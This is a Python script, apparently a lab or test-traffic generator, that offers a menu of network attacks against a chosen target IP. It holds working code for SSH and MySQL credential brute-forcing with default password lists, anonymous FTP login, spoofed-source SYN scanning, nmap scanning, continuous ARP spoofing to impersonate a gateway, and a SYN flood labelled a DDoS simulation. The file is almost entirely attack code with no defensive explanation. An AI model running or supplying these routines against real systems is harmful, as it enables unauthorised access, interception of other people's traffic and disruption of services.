import paramiko
import ftplib
import requests
import mysql.connector
import subprocess
from mysql.connector import errors
from scapy.all import send, ARP, IP, TCP
from time import sleep

# Brute force SSH
def brute_force_ssh(target_ip, port=22):
    usernames = ['admin', 'root', 'user']
    passwords = ['123456', 'password', 'admin']
    for user in usernames:
        for passwd in passwords:
            sleep(1)
            try:
                print(f"Attempting SSH login with {user}:{passwd}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, port=port, username=user, password=passwd, timeout=2)
                print("[+] SSH Login Successful")
                client.close()
                return
            except paramiko.AuthenticationException:
                print("[-] SSH Login Failed")
            except Exception as e:
                print(f"Error: {e}")

# FTP Attack
def ftp_attack(target_ip, port=21):
    try:
        print(f"Attempting FTP login to {target_ip}")
        ftp = ftplib.FTP()
        ftp.connect(target_ip, port)
        ftp.login("anonymous", "test@example.com")
        print("[+] FTP Login Successful")
        ftp.quit()
    except Exception as e:
        print(f"[-] FTP Attack Failed: {e}")

# HTTP Probe
def http_probe(target_ip, port=80):
    try:
        print(f"Probing HTTP server on {target_ip}")
        response = requests.get(f"http://{target_ip}:{port}")
        print(f"[+] HTTP Response: {response.status_code}")
    except Exception as e:
        print(f"[-] HTTP Probe Failed: {e}")

# MySQL Brute Force
def mysql_brute_force(target_ip, port=3306):
    usernames = ['root', 'admin', 'test']
    passwords = ['password', '12345', 'admin']
    for user in usernames:
        for passwd in passwords:
            try:
                print(f"Attempting MySQL login with {user}:{passwd}")
                conn = mysql.connector.connect(
                    host=target_ip,
                    port=port,
                    user=user,
                    password=passwd
                )
                print("[+] MySQL Login Successful")
                conn.close()
                return
            except errors.ProgrammingError:
                print("[-] MySQL Login Failed")
            except Exception as e:
                print(f"Error: {e}")

# Port Scan

def syn_scan(target_ip):
    src_ip = "192.168.1.10"
    print(f"Performing SYN scan on {target_ip} from {src_ip}")
    try:
        for port in range(20, 30):  # Scanning ports 20-30
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=port, flags='S')
            send(packet, verbose=0)
            sleep(0.1)
        print("[+] SYN Scan completed")
    except Exception as e:
        print(f"Error during SYN scan: {e}")

def scan_ports(ip_range):
    print(f"Attempting nmap on " + ip_range)
    try:
        scan_result = subprocess.run(['nmap', '-sS', ip_range], capture_output=True, text=True)
        print(scan_result.stdout)
    except Exception as e:
        print(f"Error when scanning ports : {e}")

# ARP Spoofing
def arp_spoof(target_ip, target_mac, gateway_ip):
    print(f"Performing ARP spoofing on {target_ip}")
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        send(packet, verbose=0, loop=1, inter=2)
    except Exception as e:
        print(f"Error during ARP spoofing: {e}")

# DDoS Simulation
def simulate_ddos(target_ip):
    print(f"Simulating DDoS attack on {target_ip}")
    try:
        for _ in range(200):
            packet = IP(dst=target_ip) / TCP(dport=80, flags='S')
            send(packet, verbose=0)
            sleep(0.05)
        print("[+] DDoS simulation completed")
    except Exception as e:
        print(f"Error during DDoS simulation: {e}")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with target IP

    while True:
        print("\nSelect an attack to perform:")
        print("1. Port Scan")
        print("2. SYN Scan")
        print("3. Brute Force SSH")
        print("4. FTP Attack")
        print("5. HTTP Probe")
        print("6. MySQL Brute Force")
        print("7. DDoS Simulation")
        print("8. ARP Spoofing")
        print("9. Quit")

        choice = input("Enter your choice: ")

        if choice == "1":
            scan_ports(target_ip)
        elif choice == "2":
            syn_scan(target_ip)
        elif choice == "3":
            brute_force_ssh(target_ip)
        elif choice == "4":
            ftp_attack(target_ip)
        elif choice == "5":
            http_probe(target_ip)
        elif choice == "6":
            mysql_brute_force(target_ip)
        elif choice == "7":
            simulate_ddos(target_ip)
        elif choice == "8":
            target_mac = input("Enter target MAC address: ")
            gateway_ip = input("Enter gateway IP: ")
            arp_spoof(target_ip, target_mac, gateway_ip)
        elif choice == "9":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

